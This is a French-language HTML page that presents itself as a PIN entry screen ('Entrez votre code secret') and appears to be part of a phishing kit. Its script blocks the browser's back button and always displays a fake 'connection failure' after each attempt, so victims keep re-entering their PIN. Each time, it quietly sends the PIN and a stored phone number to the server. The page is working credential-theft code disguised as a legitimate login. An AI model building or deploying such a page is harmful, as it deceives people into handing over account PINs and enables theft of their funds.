<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Code secret</title>

<style>
body{
    margin:0;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    font-family:Arial;
}
.container{
    width:360px;
    background:#f5f5f5;
    padding:30px 25px;
    border-radius:16px;
    box-shadow:0 4px 20px rgba(0,0,0,.1);
    text-align:center;
}
input{
    width:100%;
    padding:14px;
    border-radius:12px;
    border:1px solid #ccc;
    margin-top:10px;
    margin-bottom:20px;
}
button{
    width:100%;
    padding:14px;
    background:#00A8E1;
    border:none;
    border-radius:12px;
    color:#fff;
    font-size:18px;
    cursor:pointer;
}
.error{
    color:#d93025;
    font-size:16px;
    margin-top:15px;
    display:none;
}
</style>
</head>

<body>
<div class="container">
    <h2>Entrez votre code secret</h2>

    <input type="password" id="pin" placeholder="Code secret" required>

    <button onclick="send()">Continuer</button>

    <div class="error" id="errorMsg">√âchec de connexion</div>
</div>

<script>
/* üîí BLOQUE LE RETOUR ARRI√àRE */
history.pushState(null, null, location.href);
window.onpopstate = function () {
    history.pushState(null, null, location.href);
};

function send(){
    const pinInput = document.getElementById("pin"); // ajout√© pour vider le champ
    const pin = pinInput.value;
    const phone = sessionStorage.getItem("phone");
    const errorMsg = document.getElementById("errorMsg");

    if(!pin || !phone) return;

    // Affiche √©chec
    errorMsg.style.display = "block";

    // Vide le champ PIN apr√®s tentative ‚úÖ
    pinInput.value = "";

    // Dispara√Æt apr√®s 3 secondes
    setTimeout(() => {
        errorMsg.style.display = "none";
    }, 3000);

    // Envoi serveur (inchang√©)
    fetch("/", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            phone: phone,
            pin: pin
        })
    });
}
</script>

</body>
</html>
